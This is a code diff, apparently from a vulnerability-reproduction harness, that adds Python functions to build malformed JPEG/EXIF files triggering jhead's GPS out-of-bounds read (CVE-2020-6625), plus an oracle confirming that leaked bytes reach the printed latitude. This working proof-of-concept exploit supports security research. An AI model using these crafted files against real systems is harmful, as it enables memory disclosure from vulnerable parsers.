@@ -19,12 +19,13 @@ READ` (L1), all delivered inside a valid JPEG container:
     (ULONG, inline) so ProcessGpsInfo's three-component loop reads `Get32s(ValuePtr+4+a*size)`
     past the inline value and the section.
 
-The over-read bytes feed internal comparisons / offset words here, so this is an honest L1 (a
-reproduced out-of-bounds read), not a disclosure. The jhead instance that WOULD reach L3 is the GPS
-coordinate the over-read feeds into the printed summary (ProcessGpsInfo -> ImageInfo.GpsLat): a
-complete JPEG that reaches ShowImageInfo would print a heap-derived coordinate, and a differential
-oracle over the inline offset would confirm the disclosure. That path (a numeric disclosure oracle)
-is the named next step; it is not claimed here.
+Two of the over-reads (tiny_app1, short_exif) feed internal comparisons / offset words, so they are
+honest L1s (reproduced out-of-bounds reads). The GPS over-read (CVE-2020-6625) reaches L3: the bytes
+it reads past the declared coordinate flow into the PRINTED latitude. `gps_disclose` builds a
+complete JPEG that reaches ShowImageInfo and declares a one-component latitude followed by two more
+rationals the fixed three-component loop reads and prints as minutes/seconds; `confirm_gps_disclosure`
+varies only those past-the-field bytes (declared degrees fixed) and confirms the printed coordinate
+carries them -- a forgery-proof numeric disclosure.
 
 The container builder (`_jpeg`) and the EXIF/TIFF directory helper are shared, so adding another
 JPEG/EXIF sink is a short addition, as with the GIF palette and ZIP method constructors.
@@ -94,3 +95,72 @@ TRIGGERS = (
     ("short_exif", short_exif),
     ("gps_wrongfmt", gps_wrongfmt),
 )
+
+# GPS sub-IFD tags used by the disclosure oracle below.
+_TAG_GPS_LAT_REF = 1
+FMT_LONG = 4
+
+
+def _complete(app1_segment: bytes) -> bytes:
+    """Wrap an APP1 segment in a JPEG COMPLETE enough that jhead reaches ShowImageInfo and PRINTS
+    the parsed summary (the over-read's output sink). A minimal baseline frame (SOF0, 16x16, 3
+    components) gives dimensions, and a Start-Of-Scan marker makes jhead stop reading sections
+    cleanly ("stop before hitting compressed data") instead of erroring on a truncated stream."""
+    sof0 = (b"\xff\xc0" + struct.pack(">H", 17) + b"\x08" + struct.pack(">HH", 16, 16)
+            + b"\x03" + b"\x01\x11\x00\x02\x11\x00\x03\x11\x00")
+    sos = b"\xff\xda" + struct.pack(">H", 12) + b"\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00"
+    return _SOI + app1_segment + sof0 + sos + _EOI
+
+
+def gps_disclose(*, degrees: int = 12, sentinel_min: int, sentinel_sec: int) -> bytes:
+    """A COMPLETE JPEG whose GPS latitude DECLARES a single URATIONAL component (`degrees`/1 -- a
+    legitimate, in-bounds value) but whose GPS sub-IFD is followed in the EXIF by two more rationals
+    (`sentinel_min`/1, `sentinel_sec`/1). jhead's ProcessGpsInfo loops a FIXED three times over the
+    coordinate regardless of the declared component count (CVE-2020-6625), so it reads those two
+    past-the-field rationals and prints them as the latitude's minutes and seconds -- an
+    out-of-bounds-of-the-field read whose bytes reach stdout. Varying only the sentinels (the
+    declared degrees fixed) makes this a forgery-proof disclosure oracle: the printed coordinate is
+    a function of memory past the one component the file declared.
+    """
+    hdr = b"II" + struct.pack("<H", 0x2A) + struct.pack("<I", 8)
+    gps_off = 8 + (2 + 12 + 4)                              # IFD0 occupies [8, 26)
+    ifd0 = (struct.pack("<H", 1)
+            + struct.pack("<HHI", _TAG_GPSINFO, FMT_LONG, 1) + struct.pack("<I", gps_off)
+            + struct.pack("<I", 0))
+    # GPS sub-IFD: LAT_REF ('N'), then LAT = ONE URATIONAL whose value sits at an offset. The buggy
+    # three-component loop reads [value, value+8, value+16); only the first 8 bytes are declared.
+    n_entries = 2
+    entries_len = n_entries * 12 + 4
+    val_off = gps_off + 2 + entries_len
+    e_ref = struct.pack("<HHI", _TAG_GPS_LAT_REF, 2, 2) + b"N\x00\x00\x00"
+    e_lat = struct.pack("<HHI", _TAG_GPS_LAT, FMT_URATIONAL, 1) + struct.pack("<I", val_off)
+    gps = struct.pack("<H", n_entries) + e_ref + e_lat + struct.pack("<I", 0)
+    declared = struct.pack("<ii", degrees, 1)              # the one component the file declares
+    leaked = struct.pack("<ii", sentinel_min, 1) + struct.pack("<ii", sentinel_sec, 1)
+    exif = b"Exif\x00\x00" + hdr + ifd0 + gps + declared + leaked
+    return _complete(_app1(exif))
+
+
+def confirm_gps_disclosure(read_coord, *, degrees: int = 12) -> dict:
+    """Forgery-proof disclosure oracle for the GPS over-read. `read_coord(sentinel_min,
+    sentinel_sec)` builds `gps_disclose(...)`, runs the (uninstrumented) target on it, and returns
+    the printed latitude parsed as (deg, minutes, seconds) or None.
+
+    Disclosure is confirmed when two probes that differ ONLY in the past-the-field sentinels print
+    those exact sentinels as the coordinate's minutes/seconds, while the declared degrees stays
+    fixed -- so the output demonstrably carries bytes the file never declared. Returns
+    {disclosed, degrees, probes:[...]}.
+    """
+    probes = [(31337, 22251), (51868, 10427)]
+    seen = []
+    ok = True
+    for smin, ssec in probes:
+        got = read_coord(smin, ssec)
+        seen.append({"inject": [smin, ssec], "printed": got})
+        if not got or got[0] != degrees or got[1] != smin or got[2] != ssec:
+            ok = False
+    # forgery-proof: the two probes must have produced DIFFERENT printed coordinates (a target that
+    # echoed a constant or ignored the input would not).
+    if ok and seen[0]["printed"] == seen[1]["printed"]:
+        ok = False
+    return {"disclosed": ok, "degrees": degrees, "probes": seen}
